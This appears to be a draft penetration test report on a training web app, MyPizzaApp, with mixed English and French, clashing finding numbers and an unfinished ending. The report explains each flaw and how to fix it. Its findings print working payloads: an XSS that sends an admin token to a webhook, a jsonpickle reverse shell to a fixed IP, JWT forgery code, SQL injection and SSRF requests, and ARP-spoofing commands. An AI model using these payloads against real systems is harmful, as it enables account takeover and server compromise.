# Offensive Security OSCP Exam Penetration Test Report

## 2 High-Level Summary
This report documents the security assessment performed against **MyPizzaApp**, a web application developed for the UBIK Learning Academy platform. The application allows users to comment on pizzas and administrators can add more pizza options. This assessment simulates a realistic white-box attack scenario, progressing from an unauthenticated posture to complete server compromise. The application includes an Angular frontend, a FastAPI backend, an Nginx reverse proxy, a PostgreSQL database, and an auxiliary administrative review bot used when comments are posted.  
The assessment identified multiple critical weaknesses affecting authentication, authorization, input handling, cryptography, transport security, and operational hardening. The most severe issue is unsafe deserialization in the pizza creation endpoint, which allows **remote code execution** once an attacker obtains an administrative token. Two practical attack paths were identified: a stored XSS leading to administrative token theft and then RCE, and a separate JWT forgery path enabled by hardcoded secrets and weak JWT design.

### 2.1 Recommendations
1. **Eliminate Unsafe Deserialization**: Completely remove `jsonpickle.decode` with `safe=False`. Implement strong input schema parsing using static Pydantic models.
2. **Context-Aware Output Encoding**: Remove all instances of Angular’s `bypassSecurityTrustHtml` on user-supplied parameters and enforce strict server-side HTML sanitization or pure-text rendering.
3. **Secrets Externalization**: Purge all hardcoded credentials, JWT signature keys, and database connection strings from code repositories and use environment variables managed via a secure secrets manager.
4. **Session Security Upgrades**: Transition token storage from `localStorage` to `HttpOnly`, `Secure`, and `SameSite=Strict` cookies to effectively neutralize token theft via client-side injection vectors.


---

## 3 Methodologies
### Scope
The assessment covered the complete MyPizzaApp stack:
- Angular frontend application.
- FastAPI / Python backend.
- Nginx reverse proxy and deployment configuration.
- PostgreSQL persistence layer.
- Administrative automation component (`xss-poller.mjs`).

### Methodology
The work combined the following approaches:
- Static review of the source code and configuration files both manually and with automated tools (SonarQube, Snyk). I focused on key files such as `docker-compose.yml`, `alembic.ini`, `environment.prod.ts`, and critical backend modules.
- Manual security analysis of authentication, routing, data flows, and privileged actions. I also mapped out the application architecture, endpoints and data flows to identify trust boundaries and potential attack surfaces.
- Dynamic validation of discovered weaknesses through controlled exploitation.
- Construction of an end-to-end attack chain demonstrating progression to server compromise.
- Tools: Browser with DevTools, curl, PyJWT.


### Attack Scenario
#### Main Exploit Chain: User to Server Compromise
The primary exploit chain observed during the assessment is the following:
1. Register a standard user account (no valid email required).
2. Submit a malicious comment containing a stored XSS payload.
3. Trigger the administrative review bot (`xss-poller`), which visits the malicious comment while holding an administrative JWT in browser storage.
4. Exfiltrate the administrator token from `localStorage`.
5. Reuse the stolen token against the administrative API surface.
6. Send a malicious `jsonpickle` payload to `/api/pizza/create`.
7. Achieve arbitrary command execution and obtain a reverse shell.
8. Interact with the PostgreSQL database and modify account roles or data for persistence.

This chain demonstrates that a low-privileged user can obtain full control over the application server with no need for prior administrative access.


#### Alternate Attack Path: JWT Forgery
A second attack path exists without relying on the XSS bot flow:
1. Extract hardcoded JWT secrets from the codebase or deployment files.
2. Forge a valid administrative JWT using the known signing secret.
3. Insert the forged token into the browser session or call privileged API endpoints directly.
4. Reach protected administrative functionality.
5. Exploit unsafe deserialization to obtain code execution.

This path is especially important because it shows that the compromise is not dependent on one bug alone. Even if the XSS issue were fixed, the authentication design would still permit privilege escalation and server compromise.
<!-- TODO -->

#### Post-Exploitation and Persistence
Once shell access is obtained, the environment allows post-exploitation actions such as:
- Listing users from the database.
- Editing user roles to grant permanent administrative access.
- Reading environment variables and runtime metadata.
- Searching for flags and other sensitive files.
- Modifying or deleting application data.

The assessment notes also show evidence of editing the database and verifying role changes through the application interface, which demonstrates persistence beyond the initial transient token theft.


---

## 4 Independent Challenges

### Target Name: MyPizzaApp Component Ecosystem

---

### Finding 1: Remote Code Execution via Unsafe jsonpickle Deserialization

* **CVSS 4.0 Score**: 9.4 (Critical)
* **Vector String**: CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H
* **OWASP Top 10**: A03:2021-Injection
* **CWE:** CWE-502 – Deserialization of Untrusted Data  
**Affected Component:** `backend/src/awefull_pizza_shop/webserver/routers/pizza.py`

* **Summary**: The backend endpoint handles input decoding through an unrestricted deserialization library configuration, allowing authenticated administrators to execute arbitrary OS commands.

* **Description**: The endpoint `/api/pizza/create` within `backend/src/awefull_pizza_shop/webserver/routers/pizza.py` takes raw input data and passes it directly to `jsonpickle.decode(..., safe=False)`. Because the execution environment explicitly disables safety limitations, processing incoming parameters containing custom object reconstruction rules triggers arbitrary code execution within the context of the running application process.

* **Initial Access**: Authenticated administrative session required (obtained via Finding 2 or Finding 3).

* **Post Exploitation**
Using a structured python execution block payload wrapped in a base64 encoding wrapper string, a reverse shell connection was initialized back to the controller interface at `172.27.248.70:9001`:
```html
<img src="x" onerror="fetch('/api/pizza/create',{method:'POST',headers:{'Authorization':'Bearer '+localStorage.getItem('access_token'),'Content-Type':'application/json'},body:JSON.stringify({'py/object':'awefull_pizza_shop.webserver.schemas.PizzaCreation','name':{'py/reduce':[{'py/type':'subprocess.getoutput'},{'py/tuple':['echo $RANDOM; echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE3Mi4yNy4yNDguNzAiLDkwMDEpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtwdHkuc3Bhd24oIi9iaW4vc2giKSc= | base64 -d | bash &']}]},'description':'pwned','price':13.37,'image_url':'http://x','category':'MEAT'})});">
```
The server accepted and processed the input payload, returning a functional root-level prompt inside the docker infrastructure space.
We use `subprocess` to avoid logs showing errors in the backend. `$RANDOM` is used to generate a unique string for each attempt since the pizza's id enforces a unique constraint. 

* **Impact**: Arbitrary command execution on the backend, allowing modification of database files, extraction of runtime keys, and pivot capabilities deeper into adjacent virtual container architectures.

* **Recommendations**
* Completely remove `jsonpickle.decode` from input processing paths.
* Enforce type-safe native parsing frameworks (such as Pydantic structural specifications or standard python `json.loads`) to safely map properties without evaluation logic.
* Restrict `/api/pizza/create` to a hardened administrative workflow with server-side authorization checks.

* **References**
* [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)

---

### Finding 2: Administrative Token Theft via Stored Cross-Site Scripting (XSS)
* **CVSS 4.0 Score**: 8.7 (High)
* **Vector String**: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:A/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N
* **OWASP Top 10**: A03:2021-Injection
* **CWE:** CWE-79 – Cross-Site Scripting, CWE-306 – Missing Authentication for Critical Function
* **Affected Components:** `pizza-comment-card.component.html`, `pizza-comment-card.component.ts`, `routers/comment.py`, `xss-poller.mjs`

* **Summary**: User-supplied comments are handled without proper sanitization, allowing standard application accounts to inject script content executed by internal administrative simulation components.

* **Description**: The template file `pizza-comment-card.component.html` renders comments using the `[innerHTML]` property assignment linked with an explicit bypass filter rule (`bypassSecurityTrustHtml`) inside the component controller file. This bypass deactivates native platform cross-site scripting controls. Concurrently, an exposed poller framework (`xss-poller.mjs`) instructs an administrative test account simulation script to browse public comment locations while maintaining a live administrative credential token inside browser storage.

* **Initial Access**: This finding is the primary entry vector used to escalate privileges from a standard registered client to an administrator.

* **Exploitation**
A standard user can submit a malicious comment containing an `onerror` or script payload. When the administrative bot visits the comment page, the payload executes in the privileged browser context and exfiltrates the stored token to an attacker-controlled endpoint.

* **Post Exploitation**
An unprivileged account posted a customized observation block incorporating a script event handler tracking to an external capture link destination:
```html
<img src="x" onerror="window.location.href='https://webhook.site/d99b0ff5-22d8-4132-a618-345d05aca3ac?token=' + localStorage.getItem('access_token') + '&page=' + window.location.pathname + '&user=xss_poller';">
```
When the automation process evaluated the submitted location record, it triggered the script event logic, leaking a valid administrative authentication string back to the capture endpoint logs within the expiration time limit framework.

* **Impact**
- Theft of administrator sessions.
- Immediate access to privileged UI and API actions.
- Reliable first step in the full compromise chain.
- Support for further exploitation such as RCE through administrative endpoints.


* **Recommendations**
* Eliminate the usage of `bypassSecurityTrustHtml` on text segments provided by users.
* Implement context-aware validation parameters or enforce safe content compilation via strict server-side rendering policies (e.g., Bleach framework controls).
* Migrate administrative authentication objects from JavaScript accessible `localStorage` structures into `HttpOnly` cookie values.
* - Protect the bot endpoint with authentication and trusted-caller restrictions.
- Do not store privileged tokens in JavaScript-accessible storage.
- Consider Content Security Policy and safe output encoding as defense in depth.


* **References**
* [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)

---

### Finding 3: Hardcoded Secrets and Credentials
* **CVSS 4.0 Score**: 8.6 (High)
* **Vector String**: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N
* **OWASP Top 10**: A05:2021-Security Misconfiguration
* **Affected Components:** `docker-compose.yml`, `config.py`, `environment.prod.ts`, `alembic.ini`
* **Summary**: Production deployment files and application source modules maintain identical static secret string configurations, permitting direct generation of validated administrative sessions.
* **Description**: Cryptographic verification keys and critical target connection configurations are committed explicitly within version repository structures:
* `docker-compose.yml`: `SuperSecretKeyThatIsTottalyNotRandom`
* `config.py`: `JWT_SECRET_KEY = "changeme"`
* `environment.prod.ts`: `jwtSecret: "SuperSecretKeyThatIsTottalyNotRandom"`
| Fichier | Secret exposé |
|---|---|
| `docker-compose.yml` | `JWT_SECRET_KEY=SuperSecretKeyThatIsTottalyNotRandom` |
| `docker-compose.yml` | `postgresql+asyncpg://awefull_pizza_shop:awefull_password@postgres/awefullpizzashop` |
| `config.py` | `JWT_SECRET_KEY = "changeme"` |
| `environment.prod.ts` | `jwtSecret: "SuperSecretKeyThatIsTottalyNotRandom"` |
| `alembic.ini` | URL de connexion BDD avec credentials en clair |

* **Initial Access**: Yes. Knowing these values allows an attacker to bypass all frontend security components by minting arbitrary valid signatures locally.

#### Post Exploitation
Using local scripting tools, an attacker can create an administrative credential identity structure signature using the leaked static repository verification parameter key:

```python
import jwt
import time

secret = "SuperSecretKeyThatIsTottalyNotRandom"
payload = {
    "sub": "username:admin_user",
    "role": "Admin",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600
}
forged_token = jwt.encode(payload, secret, algorithm="HS256")
print(forged_token)
```

The resulting token value can be placed directly into a browser session storage layer, enabling immediate administrative access to restricted application management routes.

* **Impact**: Total authorization bypass across the target application ecosystem. Attackers can assume any identity structure or administrative status without tracking or verification checks.
* - Forgery of valid authentication tokens.
- Direct database access if network reachability exists.
- Easier lateral movement and service compromise.
- Secret reuse risk across environments.

#### Recommendations
* Purge structural signature configuration entries from source material definitions completely.
* Inject operational environment target secrets dynamically during infrastructure startup via secure, externalized configuration mechanisms.
* - Remove all secrets from source code and configuration files.
- Use environment variables or a dedicated secrets manager.
- Rotate all known exposed secrets immediately.
- - Générer des secrets JWT avec une entropie suffisante : `secrets.token_hex(32)`.
- Add repository scanning to prevent future secret commits.

#### References

* [CWE-798: Use of Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html)

---

### Finding 4: Comprehensive Data Dump via Category Filter SQL Injection

* **CVSS 4.0 Score**: 7.4 (High)
* **Vector String**: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N
**Affected Component:** `database/pizza/repository.py`
* **OWASP Top 10**: A03:2021-Injection
* **Summary**: The category extraction filter compiles search queries using raw concatenation logic, enabling data structure modification and arbitrary extraction commands.
* **Description**: The database interaction layer mapped to the route `/api/pizza/category/{category}` within `backend/src/awefull_pizza_shop/database/pizza/repository.py` handles variable sorting criteria using raw format definitions (`text(f"category='{category}'")`). Lacking structural processing abstraction rules, characters appended to incoming request parameters alter query evaluation logic paths.

#### Post Exploitation

An authenticated user submitted an escaped string structure value (`MEAT' OR 1=1--`) designed to bypass query logic checks:
```javascript
fetch("https://app1.tiweb.tp.ubik.academy/api/pizza/category/MEAT'%20OR%201=1--", {
  method: 'GET',
  headers: { 'Authorization': 'Bearer ' + localStorage.getItem('access_token') }
})

```

The backend processed the query and disabled the filtering rule logic, returning a full object structural breakdown of all application catalog elements regardless of visibility status rules.

* **Impact**: Unauthorized access to underlying database information schemas, enabling data exfiltration, disclosure of configuration baselines, or modification of persistent tables if system write permissions allow.
* - Data exfiltration.
- Unauthorized reading of catalog data and potentially related tables.
- Risk of destructive or modifying SQL statements if broader privileges exist.


#### Recommendations
- Use parameterized queries or ORM-native filtering.
- Whitelist accepted category values.
- Reject unexpected characters and malformed categories.

#### References

* [CWE-89: Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html)

---


### Finding 5: Server-Side Request Forgery (SSRF) via Uncontrolled `image_url` Handling
* **CVSS 4.0 Score**: 7.1 (High)
* **Vector String**: CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:N/VA:N/SC:L/SI:N/SA:N
* **OWASP Top 10**: A10:2021-Server-Side Request Forgery
**Affected Components:** Pizza schema and pizza creation/edit paths
* **Summary**: The application accepts arbitrary address parameters within resource initialization routines, permitting interaction with protected internal assets.
* **Description**: Object initialization parsing within `schemas/pizza.py` takes incoming strings for properties like `image_url` without validation constraints. When administrative users or internal browser engine processes handle these values, the host system performs outbound lookups to the specified locations, bypassing boundary access restrictions.

#### Post Exploitation

An administrator populated an object registration block targeting an out-of-band monitoring asset:

```javascript
body: JSON.stringify({
  "py/object": "awefull_pizza_shop.webserver.schemas.PizzaCreation",
  "name": "SSRF Test",
  "description": "Testing SSRF",
  "price": 10.0,
  "image_url": "https://webhook.site/d99b0ff5-22d8-4132-a618-345d05aca3ac",
  "category": "MEAT"
})

```
```bash
curl -X POST https://app1.tiweb.tp.ubik.academy/api/pizza/create \
  -H "Authorization: Bearer <admin_token>" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "SSRF Test",
    "description": "test",
    "price": 10,
    "image_url": "file:///etc/passwd",
    "category": "MEAT"
  }'
```

The backend components completed the validation process and initiated outbound connections to the test location, confirming that the server interacts directly with unverified network destinations.

* **Impact**: Internal network exposure, scanning capabilities against private microservices, and potential exposure of cloud metadata points or adjacent data stores.
* - Access to internal services.
- Outbound network scanning.
- Potential file disclosure and metadata access depending on fetch behavior.
- Additional pivot paths from an already privileged position.


#### Recommendations

* Implement strict destination whitelisting rules restricting inputs to trusted, explicit domains.
* Use strict type checking (e.g., Pydantic's `HttpUrl`) and reject internal network address schemes (`file://`, `gopher://`, localhost loopbacks).
* - Enforce `http` / `https` only.
- Block `file`, `gopher`, `dict`, `data`, `javascript`, loopback, and RFC1918 destinations.
- Use allowlisted domains for media sources.
- Apply timeouts, response size limits, and SSRF-safe fetch controls.


#### References

* [CWE-918: Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)



### F-04 Weak JWT Design and Client Trust in Role Claim

**Severity:** Critical  
**CWE:** CWE-345 – Insufficient Verification of Data Authenticity  
**Affected Components:** Frontend authentication and guard logic, `xss-poller.mjs`

#### Description

The application places the role inside the JWT and relies on the decoded token content on the client side for administrative route access. The `AdminGuard` trusts the `role` claim, meaning a forged or stolen token is enough to unlock the administrative UI.Le fichier `xss-poller.mjs` signe explicitement un token avec `{'sub': 'username:admin_user', 'role': 'Admin'}`, confirmant que le rôle est un claim du token.

#### Exploitation

Once a token is forged or captured, editing browser storage with a token containing `role: Admin` is sufficient to pass client-side checks and expose privileged navigation and screens.
```javascript
// Dans la console du navigateur :
localStorage.setItem('access_token', forged_admin_token);
location.reload();
// => Accès complet à l'interface admin
```

#### Impact

- Client-side privilege escalation.
- Misleading separation between visible and real authorization checks.
- Easier chaining with token theft and hardcoded-secret issues.

#### Remediation

- Treat JWT claims as untrusted on the client.
- Perform all authorization decisions on the server.
- Reduce JWT contents to minimal identity claims.
- Derive permissions from server-side state rather than browser-decoded tokens.


### F-05 Token Storage in `localStorage`

**Severity:** Critical  
**CWE:** CWE-922 – Insecure Storage of Sensitive Information  
**Affected Component:** `auth.service.ts`

#### Description

The access token is stored in `localStorage`, making it readable by any JavaScript executing in the origin, including malicious scripts introduced through XSS.

#### Exploitation

The stored XSS path demonstrated that token exfiltration is not theoretical. Any malicious script, browser extension, or compromised frontend asset can read and reuse the token.
```javascript
// Accessible par n'importe quel script XSS :
console.log(localStorage.getItem('access_token'));
```

#### Impact

- Session theft.
- Long-lived persistence across tabs and restarts until token expiry or logout.
- Amplification of all XSS-class vulnerabilities.

#### Remediation

- Move session material to `HttpOnly`, `Secure`, `SameSite=Strict` cookies.
- Reduce token lifetime and implement refresh rotation.
- Avoid exposing high-privilege tokens to frontend JavaScript.


### F-06 Privilege Escalation via Self-Role Modification

**Severity:** Critical  
**CWE:** CWE-269 – Improper Access Control  
**Affected Components:** `routers/user.py`, `schemas/user.py`

#### Description

The user update flow (`POST /users/{user_id}`) accepts a `role` field but does not enforce appropriate authorization boundaries on role changes. The assessment notes indicate that a user can modify their own role to `Admin` through the update endpoint or, after shell access, by editing the database directly and verifying the new privileges in the UI.

#### Exploitation

A crafted POST request containing `"role": "Admin"` can grant elevated privileges if backend validation is insufficient. Additional evidence in the notes shows database-backed role modification on the admin dashboard / SQL side and verification of the resulting administrative status.
```bash
# Étape 1 : obtenir son propre user_id
curl http://localhost:7465/api/users/me \
  -H "Authorization: Bearer <normal_user_token>"

# Étape 2 : s'escalader en Admin
curl -X POST http://localhost:7465/api/users/<own_user_id> \
  -H "Authorization: Bearer <normal_user_token>" \
  -H "Content-Type: application/json" \
  -d '{"name":"user","email":"user@example.com","role":"Admin"}'
```

#### Impact

- Immediate privilege escalation to administrative access.
- Direct access to sensitive administrative endpoints.
- Enables full exploit chaining toward RCE.
- Supports durable persistence after initial access.

#### Remediation

- Remove `role` from the generic self-update schema.
- Create a separate admin-only role-management endpoint.
- Enforce server-side ownership and privilege checks before processing updates.
- Log and alert on any role change event.


### F-09 Input Validation Weaknesses Across Multiple Flows

**Severity:** High  
**CWE:** CWE-20 – Improper Input Validation  
**Affected Components:** Comments, pizza creation/editing, user editing, login/register flows

#### Description

The analysis found a general absence of strict server-side validation. Several fields accept free-form values that later influence rendering, privileged state changes, or backend processing.
- **Commentaires** : `bypassSecurityTrustHtml` + `[innerHTML]` sans sanitisation → XSS stockée (Finding 2).
- **Création/édition de pizza** : `name`, `description`, `imageUrl`, `category` sans validation serveur → SSRF, XSS via `javascript:` URLs.
- **Édition utilisateur** : `email`, `name`, `role` sans vérification de propriété ni allowlist → escalade de privilèges (Finding 6).
- **Login/Register** : validation front-end uniquement, facilement contournable.
- **Filtre catégorie** : chaîne brute injectée dans SQL (Finding 7).


#### Exploitation

This systemic issue underpins several concrete findings: stored XSS in comments, SSRF in `image_url`, role tampering in user updates, and potentially unsafe rendering of attacker-controlled URLs or HTML.

#### Impact

- Broad expansion of attack surface.
- Easier chaining of independent weaknesses.
- Difficulty reliably containing future bugs.

#### Remediation

- Define strict schemas for every request body.
- Apply server-side allowlists and normalization.
- Reject unsafe schemes and unexpected object keys.
- Treat frontend validation as usability only, not as a security control.



### F-10 Route-Guard Bypass Through Client-Side Checks

**Severity:** High  
**CWE:** CWE-602 – Client-Side Enforcement of Server-Side Security  
**Affected Components:** `AuthGuard`, `AdminGuard`

#### Description

The frontend route guards rely on token presence and decoded client-side claims rather than verified server-side authorization state.
- `AuthGuard` vérifie uniquement la présence d'un token dans `localStorage` via `isLoggedIn()`.
- `AdminGuard` décode le JWT et lit le claim `role` sans validation serveur.
- Aucun de ces guards ne valide l'état de session côté serveur avant d'autoriser la route.

#### Exploitation
A user who edits browser storage can bypass visible route restrictions and access the administrative interface if the guard logic accepts the manipulated token.
```javascript
// Bypass AuthGuard : injecter n'importe quelle chaîne non-vide
localStorage.setItem('access_token', 'fake_token_anything');
location.reload();
// => L'interface de login est contournée

// Bypass AdminGuard : token avec role=Admin (même invalide pour le serveur)
localStorage.setItem('access_token', fake_admin_jwt);
location.reload();
// => Routes admin accessibles
```

#### Impact

- Exposure of privileged UI flows.
- Easier abuse of administrative operations.
- False sense of protection around restricted views.

#### Remediation

- Keep route guards for UX only.
- Fetch current-user authorization state from the backend before rendering privileged views.
- Clear invalid tokens and fail closed on parsing or verification errors.



### F-11 Unrestricted Data Access via Unfiltered Comments Endpoint

**Severity:** High  
**CWE:** CWE-639 – Authorization Bypass Through User-Controlled Key  
**Affected Component:** `/pizza/{pizza_id}/comments/`

#### Description

The comment listing endpoint does not correctly filter comments by the requested pizza identifier. As a result, a request for one pizza can disclose comments belonging to others.

#### Exploitation

Requesting comments for a specific pizza returns broader data than intended. This leaks information useful for reconnaissance and may expose sensitive internal discussion or attacker-controlled payload placement.
```bash
curl "http://localhost:7465/api/pizza/1/comments/"
# => Retourne les commentaires de TOUTES les pizzas, pas seulement pizza ID=1
```

#### Impact

- Unauthorized data disclosure.
- Easier discovery of attack artifacts or admin interactions.
- Information gathering for later exploitation.

#### Remediation

- Apply strict filtering on `pizza_id` in the database query.
- Add tests confirming per-resource isolation.
- Review similar list endpoints for missing scoping.


### F-12 Insecure CORS and HTTP Origin Handling

**Severity:** High  
**CWE:** CWE-319 – Cleartext Transmission of Sensitive Information  
**Affected Components:** `config.py`, deployment origin policy

#### Description

The configuration allows HTTP origins such as `http://127.0.0.1:4200`, `http://localhost:4200`, and `http://0.0.0.0:4200`. Combined with insufficient HTTPS enforcement and weak token handling, this increases exposure to interception and modification in insecure deployments.
Aucun header HSTS n'est configuré. Les tokens JWT sont transmis en clair sur HTTP. Aucun flag `Secure` sur les cookies.


#### Exploitation

An on-path attacker can observe or tamper with traffic if clients interact with the application over cleartext HTTP. Because the application uses bearer tokens, interception directly translates into account compromise.
```bash
# Attaque ARP Spoofing sur réseau local
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
# Proxy du trafic HTTP
mitmproxy -p 7465
# Interception des headers Authorization en clair
```

#### Impact

- Token theft in non-TLS paths.
- Response manipulation by a network attacker.
- Weakened environment separation between development and production assumptions.

#### Remediation
- Restrict production origins to HTTPS only.
- Remove insecure origins from production configuration.
- Enforce HSTS and HTTPS redirection.
- Prefer secure cookie transport semantics over bearer tokens in browser storage.



### F-13 Weak Cryptography and Guessable JWT Secret Model

**Severity:** High  
**CWE:** CWE-327 – Use of a Broken or Risky Cryptographic Algorithm, CWE-330 – Use of Insufficiently Random Values  
**Affected Components:** JWT design and secret management

#### Description

The application uses HS256 with weak, guessable secrets and no strong evidence of hardening around issuance, verification, or brute-force resistance. The effective trust model collapses once the signing secret is known or guessed.
- **Algorithme JWT** : HS256 (symétrique) avec un secret faible (~32 bits d'entropie effective vs 256+ recommandés).
- **Secret JWT** : `"SuperSecretKeyThatIsTottalyNotRandom"` — phrase dictionnaire, humainement devinable.
- **Absence de rate limiting** sur la génération de token et la vérification de mot de passe.

#### Exploitation

The hardcoded values shown in the repository make offline token forging trivial. Even without direct source access, human-readable secrets such as `changeme` and `SuperSecretKeyThatIsTottalyNotRandom` are unsuitable for HMAC signing of privileged tokens.
```bash
# Brute-force offline du secret JWT
john --wordlist=rockyou.txt jwt_token.txt

# Test des secrets communs
for secret in "changeme" "SuperSecretKeyThatIsTottalyNotRandom" "test" "secret"; do
  python3 -c "import jwt; print(jwt.encode({'role':'Admin'}, '$secret', 'HS256'))"
done
```

#### Impact
- Unlimited token forgery.
- Long-term compromise of the trust boundary.
- Potential for offline brute-force if secret exposure is partial.
- Rate limiting
- Use of a strong, random secret with sufficient entropy (at least 256 bits for HMAC)
- Use strong encryption algorithms (e.g., RS256 or ES256) with proper key management.

#### Remediation

- Use strong random secrets with at least 256 bits of entropy if symmetric signing is retained.
- Prefer asymmetric signing and strict verifier configuration.
- Rotate keys regularly and after any suspected exposure.
- Add rate limiting on authentication endpoints.



### F-14 Exposed Source Maps, Debug Metadata, and Server Fingerprints

**Severity:** Medium  
**CWE:** CWE-200 – Exposure of Sensitive Information to an Unauthorized Actor  
**Affected Components:** Frontend build output, Nginx, `xss-poller.mjs`, environment files
- **OWASP** : A05:2021-Security Misconfiguration


#### Description

The analysis notes production exposure risks from source maps, bundled environment details, plaintext secrets in config files, missing security headers, and framework-identifying headers such as `X-Powered-By`.
- `tsconfig.json` a `sourceMap: true` activé, ce qui génère des `.map` potentiellement exposés en production.
- `environment.ts` embarque l'URL de base de l'API dans le bundle navigateur.
- `alembic.ini` et `config.py` exposent credentials BDD et secrets JWT en clair.
- Nginx ne masque pas la version du serveur ni n'ajoute les headers de sécurité.
- `xss-poller.mjs` expose le framework (Express) via le header `X-Powered-By`.



#### Exploitation
An attacker can use source maps and server metadata to reconstruct frontend code paths, discover hidden routes or implementation details, fingerprint services, and accelerate targeted exploitation.

#### Impact

- Increased recon value.
- Easier discovery of weak code paths.
- Disclosure of implementation details that should remain internal.

#### Remediation

- Disable public source maps in production unless access-controlled.
- Remove secrets from frontend bundles and config artifacts.
- Hide framework and version headers.
- Add security headers such as `X-Content-Type-Options`, `X-Frame-Options`, and HSTS.
- Ajouter les headers de sécurité dans Nginx : `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `X-XSS-Protection: 1; mode=block`, `Server: MyPizzaApp` (masquer la version).
- Désactiver le header `X-Powered-By` dans Express : `app.disable('x-powered-by')`.




### F-15 Timing-Attack Mitigation Flaw Enabling User Enumeration Risk

**Severity:** Medium  
**CWE:** CWE-208 – Observable Timing Discrepancy  
**Affected Component:** `security/service.py`

#### Description

A hardcoded bcrypt lure hash is used in an attempt to normalize login timing for nonexistent users. Because this value is static and predictable, the protection is weak and may still allow measurable differences between valid and invalid usernames.

#### Validation Status
This issue was analyzed and a timing-measurement approach was documented, but the notes describe it more as a design weakness and partially validated enumeration risk than as a fully demonstrated compromise primitive.
```bash
# Analyse statistique des temps de réponse
for i in {1..100}; do
  time curl -X POST http://localhost:7465/api/token \
    -d "username=admin_user&password=wrong" >> admin_times.txt
  time curl -X POST http://localhost:7465/api/token \
    -d "username=nonexistent_xyz&password=wrong" >> none_times.txt
done
# Analyse : les utilisateurs réels ont un timing légèrement différent
```

#### Impact
- User enumeration through repeated measurements.
- Better targeting of brute-force or password-spraying attempts.

#### Remediation
- Use a runtime-generated equivalent-cost fallback path.
- Ensure consistent processing time regardless of username existence.
- Add rate limiting and monitoring to the authentication endpoint.


### F-16 Missing 404 Route and Predictable Error Handling

**Severity:** Low  
**CWE:** CWE-425 – Direct Request for Hidden File or Resource  
**Affected Component:** `app.routes.ts`
- **OWASP** : A05:2021-Security Misconfiguration

#### Description
The wildcard route is commented out, so invalid routes are not handled consistently. This makes path probing more informative than necessary.

#### Exploitation
Naviguer vers des chemins aléatoires (`/adminn`, `/pizza/../login`, `/does-not-exist`) et observer le comportement — les réponses varient selon les routes existantes ou non, facilitant l'énumération de la structure applicative.


#### Impact
- Easier route enumeration.
- More predictable recon against frontend navigation and fallback logic.

#### Remediation

- Reintroduce a safe catch-all 404 route.
- Return consistent error responses for invalid paths.



### F-17 Supply-Chain Exposure in Build Process

**Severity:** Low  
**CWE:** CWE-494, CWE-1395, CWE-506  
**Affected Components:** `Dockerfile-xss-poller`, `backend/Dockerfile`
- **OWASP** : A06:2021-Vulnerable and Outdated Components

#### Description

The build chain installs dependencies in ways that may execute package lifecycle scripts or source-distribution setup code. This increases exposure to malicious or compromised dependencies.
- `Dockerfile-xss-poller` utilise `npm install` sans `--ignore-scripts`, permettant aux hooks `preinstall`/`postinstall` d'exécuter du code arbitraire lors du build.
- `backend/Dockerfile` utilise `pip install` sans `--only-binary :all:`, permettant aux scripts `setup.py` de s'exécuter à l'installation.


#### Impact
- Build-time code execution.
- Compromised images or CI environments.
- Difficult-to-detect persistence in container artifacts.

#### Remediation
- Use deterministic lockfile-based installs.
- Disable install scripts when compatible.
- Prefer prebuilt wheels and review packages requiring source builds.
- Scan dependencies continuously in CI.



### F-18 Bearer Token Algorithm-Confusion Risk

**Severity:** Low  
**CWE:** CWE-347 – Improper Verification of Cryptographic Signature  
**Affected Component:** `security/service.py`

#### Description

The code review raised a concern that JWT verification may accept multiple algorithms or fail to reject unsafe header values such as `alg: none` if configuration is not strict.

#### Validation Status

This was not recorded as a confirmed successful bypass during the assessment. It should therefore be treated as a code-review concern requiring validation rather than as a fully exploited issue.
```python
import jwt
# Tentative de bypass avec token non-signé
payload = {'sub': 'username:admin_user', 'role': 'Admin'}
token = jwt.encode(payload, "", algorithm="none")
# Si la config accepte "none", ce token pourrait être valide
```

#### Remediation
- Pin accepted algorithms explicitly.
- Reject unsigned tokens.
- Verify expiration and all security-relevant JWT claims.



### F-19 Cleartext Token Exposure via Reverse Proxy Misconfiguration

**Severity:** Low to Medium  
**CWE:** CWE-319 – Cleartext Transmission of Sensitive Information  
**Affected Component:** `nginx.conf`
- **OWASP** : A05:2021-Security Misconfiguration

#### Description

The reverse proxy listens on both ports 80 and 443 without an explicit HTTP-to-HTTPS redirect. This creates the possibility of clients interacting over cleartext HTTP if deployment conditions permit it.
`nginx.conf` écoute sur les ports 80 et 443 dans le même bloc `server`. Il n'y a aucune redirection explicite de HTTP vers HTTPS. Le proxy transfère `/api` vers `http://backend:7465` en HTTP interne. Si un client accède au port 80, credentials et tokens sont transmis en clair.


#### Exploitation
Accéder au site via `http://app1.tiweb.tp.ubik.academy` (port 80) et vérifier que le navigateur ne fait pas de upgrade automatique vers HTTPS. Sur un réseau local, un attaquant on-path peut intercepter les credentials.


#### Impact

- Credentials and tokens can be exposed to on-path attackers.
- Browsers or tools may take inconsistent transport paths.

#### Remediation

- Add a dedicated HTTP server block redirecting to HTTPS.
- Expose only TLS externally.
- Enforce HSTS to prevent protocol downgrade.



### F-20 IDOR on User Endpoints

**Severity:** Not confirmed  
